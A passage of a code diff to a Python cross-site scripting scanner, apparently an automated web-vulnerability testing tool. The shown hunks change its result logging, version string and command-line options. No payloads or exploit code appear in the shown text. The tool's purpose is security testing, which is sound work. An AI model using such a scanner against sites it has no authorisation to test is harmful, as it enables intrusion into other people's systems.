+        self.log("📸 Multiple screenshot strategies for perfect capture!", "SCREENSHOT")
         
         try:
-            # Phase 1: Enhanced reconnaissance
-            recon_data = self.phase1_enhanced_reconnaissance()
+            # Phase 1: Perfect reconnaissance
+            recon_data = self.phase1_perfect_reconnaissance()
             if not recon_data or not self.running:
                 return
             
@@ -879,55 +573,28 @@ class PerfectPopupScanner:
             self._close_browser()
     
     def _show_final_results(self, report_path):
-        """Show final results with perfect scoring"""
+        """Show final results"""
         self.log("=" * 80, "PHASE")
         self.log("SCAN RESULTS", "PHASE")
         self.log("=" * 80, "PHASE")
         
         total_vulns = len(self.confirmed_vulnerabilities)
-        confirmed_vulns = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
         popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
         
         self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
-        self.log(f"Confirmed XSS: {confirmed_vulns}", "SUCCESS")
-        self.log(f"Popup screenshots: {popup_screenshots}", "SCREENSHOT")
-        
-        if self.confirmed_vulnerabilities:
-            avg_score = sum(v.get('score', 0) for v in self.confirmed_vulnerabilities) / total_vulns
-            self.log(f"Average score: {avg_score:.1f}/100", "SCORE")
-            
-            high_risk_vulns = [v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'HIGH']
-            medium_risk_vulns = [v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'MEDIUM']
-            low_risk_vulns = [v for v in self.confirmed_vulnerabilities if v.get('risk_level') == 'LOW']
-            
-            if high_risk_vulns:
-                self.log(f"High-risk vulnerabilities: {len(high_risk_vulns)}", "WARNING")
-            if medium_risk_vulns:
-                self.log(f"Medium-risk vulnerabilities: {len(medium_risk_vulns)}", "WARNING")
-            if low_risk_vulns:
-                self.log(f"Low-risk vulnerabilities: {len(low_risk_vulns)}", "SUCCESS")
+        self.log(f"Perfect Popup screenshots: {popup_screenshots}", "SCREENSHOT")
         
         if report_path:
             self.log(f"📊 Perfect Popup Report: {report_path}", "SUCCESS")
 
 def main():
-    parser = argparse.ArgumentParser(description='Perfect Popup XSS Scanner v15.0')
+    parser = argparse.ArgumentParser(description='Perfect Popup XSS Scanner v19.0')
     parser.add_argument('url', help='Target URL to scan')
-    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
-    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
-    parser.add_argument('--depth', type=int, default=4, help='Crawling depth (default: 4)')
     parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
     
     args = parser.parse_args()
     
-    scanner = PerfectPopupScanner(
-        args.url,
-        args.threads,
-        args.delay,
-        args.depth,
-        args.timeout
-    )
-    
+    scanner = PerfectPopupScanner(args.url, args.timeout)
     scanner.scan()
 
 if __name__ == "__main__":
